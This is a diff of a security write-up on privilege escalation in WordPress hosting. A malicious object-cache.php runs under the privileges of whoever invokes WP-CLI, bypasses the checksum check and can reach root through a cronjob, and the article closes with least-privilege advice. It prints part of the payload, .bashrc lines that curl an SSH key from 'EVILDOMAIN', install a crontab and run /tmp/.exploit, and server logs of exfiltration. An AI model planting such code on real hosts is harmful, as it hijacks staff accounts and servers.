@@ -1,6 +1,6 @@
 # Attacking hosting infrastructure through WP-CLI
 
-WP-CLI[1] is the command-line interface for WordPress, as their site claims. It gives an interface to functionality of WordPress. This is quiet cool and is used by a lot of (WordPress) hosting companies to troubleshoot and support their customers. 
+WP-CLI[1] is the command-line interface for WordPress, as their site claims. It gives an interface to functionality of WordPress. This is quite cool and is used by a lot of (WordPress) hosting companies to troubleshoot and support their customers. 
 
 An example:
 
@@ -21,11 +21,29 @@ $ wp-cli.phar checksum core --skip-themes --skip-plugins
 Success: WordPress install verifies against checksums.
 ```
 
-WP-CLI is a phar and uses the system PHP and php.ini-settings to execute WordPress to get the WordPress installation settings. This means there is code execution of code that are placed within in WordPress files. Within the example we do a checksum on the WordPress core files to check the integrety. This is a really cool feature to check for infections. We use the `--skip-themes` and `--skip-plugins` arguments to skip untrusted code in any of the plugins and themes. 
+WP-CLI is a phar (PHp ARchive) which puts an entire application and it's dependencies into a single file. This provides an easy way to have a portable executable across multi systems. This PHAR uses the system PHP and php.ini-settings when executed. 
 
-As a serious hosting company you might choose to disable the execution of system commands and process calls. This makes it a lot harder for attackers to compromise the system. So what to do when you have access to a WordPress installation and want to escalate privileges to someone with more than just a sandboxed PHP proces?
+When you execute wp-cli.phar it executes WordPress to get access to the database and settings from `wp-config.php`. This means that code gets executed that is present within the WordPress core files. Without the `--skip-themes` and `--skip-plugins` arguments code within installed plugins and themes will also be executed. As this is the main entrypoint for most infections of WordPress it is advisable to use these arguments.
 
-This is where the (optional) file wp-content/object-cache.php comes in. This file is intended for caching plugins to provice persistent object caching for WordPress objects. It is not part of WordPress core but is loaded on startup if it exists by wp-includes/load.php:
+Within the above example we do an integrity check of the WordPress core (the official files shipped with WordPress). We do this using the `wp-cli.phar checksum core` command. This makes checksums for the files in de installation directory and checks those to the checksums from the original files. If there is code added to files these checksums would not match. This is a good way to ensure nobody added code to the WordPress core files. 
+
+An example of using checksums of file content:
+```
+$ cat testfile1 
+hi
+$ cat testfile2
+hi!
+$ sha256sum testfile1 testfile2
+98ea6e4f216f2fb4b69fff9b3a44842c38686ca685f3f55dc48c5d3fb1107be4  testfile1
+1adb41cf8efa0c375bf64d08bc0fe027a720fef0d7ac05140c2a1fe1200155a2  testfile2
+```
+In the above example we see that adding just a exclamation mark would result in different checksums. By checking the checksum of the original WordPress files wp-cli.phar compares the files content to the current contents of these files. This check might give a false sense of security when dealing with WordPress as we'll show later on. 
+
+As an extra security layer most hosting companies might choose to disable the execution of PHP system commands and process calls. This makes it a lot harder for attackers. As they might have gotten access to the WordPress installation, they cannot call system commands. So what to do when you have access to a WordPress installation and want to escalate privileges to someone with more than just a sandboxed PHP proces?
+
+This is where object caching comes in. Persistent object caching is a caching strategy that stores PHP objects (for example arrays) on disk or in memory. When another request is done instead of sending the same database queries it gets the object from the cache. This can speed up the request sites that do a lot of database queries. 
+
+In WordPress this can be enabled through the optional wp-content/object-cache.php file. This file is intended for caching plugins to provide persistent object caching for WordPress objects. This file is not part of WordPress core but is loaded on startup if it exists by wp-includes/load.php:
 
 wp-includes/load.php [2]
 ```
@@ -48,40 +66,52 @@ function wp_start_object_cache() {
 <snip>
 ```
 
-Although this code should not be trusted, it is loaded and executed on every WordPress initiation. Doing a checksum on the core of WordPress skips this file, but there is no options in wp-cli.phar to skip this.  And so this could be a nice attack vector. Anyony that executes wp-cli.phar in the installation folder will execute the code in object-cache.php by default. So let's see how we could use this. 
+Although this code is part of a plugin it is executed with every request to WordPress. And so wp-cli.phar executes code within this file, even if we specify the `--skip-plugins` argument. As this file is not part of the WordPress core checking for checksums skips this file. This could be a nice attack vector.
 
-Let's setup an imaginary hosting environment:
-- Any webserver, SQL server etc you wish
-- The PHP-FPM process will run as a non-priviliged user with a /sbin/nologin shell.
-- PHP-FPM configured with a php.ini that disables 
-	- proc_open
-	- popen
-	- system
-	- show_source
-	- dl
-	- shell_exec
-	- passthru
-	- proc_terminate
-	- proc_close
-	- proc_get_status
-	- proc_nice
-	- pclose 
-	- posix_kill
-	- posix_mkfifo
-	- posix_setpgid
-	- posix_setsid	
-	- posix_setuid
-	- posix_getpwuid
-	- posix_uname
+So let's see this in action:
+```
+stat wp-content/object-cache.php
+stat: cannot stat `wp-content/object-cache.php': No such file or directory
+$ wp-cli.phar plugin list --skip-themes --skip-plugins
++-----------+----------+--------+---------+
+| name      | status   | update | version |
++-----------+----------+--------+---------+
+| hello     | inactive | none   | 1.6     |
++-----------+----------+--------+---------+
+$ echo '<?php echo "hi there\n"; ?>' > wp-content/object-cache.php
+$ wp-cli.phar plugin list --skip-themes --skip-plugins
+hi there
++-----------+----------+--------+---------+
+| name      | status   | update | version |
++-----------+----------+--------+---------+
+| hello     | inactive | none   | 1.6     |
++-----------+----------+--------+---------+
+$ wp-cli.phar checksum core
+Success: WordPress install verifies against checksums.
+```
 
+In the above example we inject `<?php echo "hi there\n"; ?>` into object-cache.php. The next time we run `wp-cli.phar` it is executed. 
 
-Although the execution of PHP (and so wp-cli.phar) will have no way to execute system binaries or scripts other than PHP. To attack the user of wp-cli.phar (which might be a supportdesk employee or a cronjob running `wp-cli.phar core update`) we could insert the following code in wp-content/object-cache.php:
+For attacking this we setup an imaginary hosting environment:
+- Linux server
+- Whatever webserver, SQL server etc you wish
+- The PHP-FPM process will run as a non-priviliged user (`webuser`) with a /sbin/nologin shell.
+- PHP-FPM configured with a php.ini that disables the following functions:
+	- proc functions (proc_open, proc_terminate, proc_close, proc_get_status, proc_nice)
+	- posix functions (posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_setuid, posix_getpwuid, posix_uname)
+	- other vulnerable function (popen, pclose, system, show_source, dl, shell_exec, passthru)
+*These are not disabled by default, but any sane hosting company would disable these.*
 
+So when a page is requested via the webserver PHP-FPM executes the WordPress installation as `webuser`. The output of the process is then served to the requestor. In this context the configuration of the server provides some security and is bound to the webroot of the site. 
+
+When a local system user (ie. sysadmins, support, client connecting via ssh, cronjobs) execute wp-cli.phar it is executing in context of that user. So the PHP process runs as the user executing it... think about that. This is where we have a way to attack the system.
+
+Let's inject the following into `wp-content/object-cache.php`. Read the comment in the code to see what it does:
 ```
 <?php    
 	@$uid = posix_getuid();
 	if( isset($uid) and $uid == 0) {
-		// in the off change that someone forces wp-cli to run as uid 0
+		// in the off change that someone forces wp-cli to run as uid 0 (root)
 		$user = 'root';
         	$keyfile = '/root/.ssh/authorized_keys';
 		$bashrc = '/root/.bashrc';
@@ -134,7 +164,7 @@ Although the execution of PHP (and so wp-cli.phar) will have no way to execute s
         @curl_close($c);
 ```
 
-So now we contact customer support and say that we cannot upgrade a plugin. When they execute wp-cli.phar the code in object-cache.php would be executed with their privileges. To be safe they use the `--skip-themes` and `--skip-plugins` arguments. They would see the following:
+So now we contact customer support and say that we cannot upgrade a plugin. When the support engineer executes wp-cli.phar the code in object-cache.php would be executed with their privileges. To be safe they use the `--skip-themes` and `--skip-plugins` arguments. They would see the following:
 ```
 $ wp-cli.phar plugin list --skip-plugins --skip-themes
 +-------------------------------+----------+--------+---------+
@@ -157,7 +187,7 @@ xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /exploit HTTP/1.1" 200 -
 xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /?xxxxx@xxxx.xxxx.com HTTP/1.1" 200 -
 ```
 
-On the hosting machine:
+On the hosting machine a quick look at the support engineers `.bashrc`:
 ```
 $ tail -n 3 ~/.bashrc 
 curl -s http://EVILDOMAIN/sshkey.pub?xxxx@xxxx.xxxx.com -o /tmp/.sshkey.pub 2>&1 > /dev/null;
@@ -165,11 +195,11 @@ crontab /tmp/.cronfile 2>&1 > /dev/null;
 /tmp/.exploit
 ```
 
-If this user logs into the system again the user executes the cronjob is inserted as the user and the exploit is executed. Now this is really, really interesting if the webhoster does updates of WordPress core through a cronjob (found this in real environment) :
+If this user logs into the system again the user executes the above. It adds the cronjob and the exploit is executed as the support engineer. Maybe the hoster automates updates for you with the following cronjob running as root:
 ```
 * 0 * * * wp-cli.phar --allow-root core update && chown -R webuser:webuser httpdocs/
 ```
-This would give us code execution for the user root on the webserver!
+This would give us code execution as root on the webserver!
 
 Solving this issue is easy. Always use the concept of least privilege. If you force the use of the non-privileged webuser misuse wil be prevented:
 ```
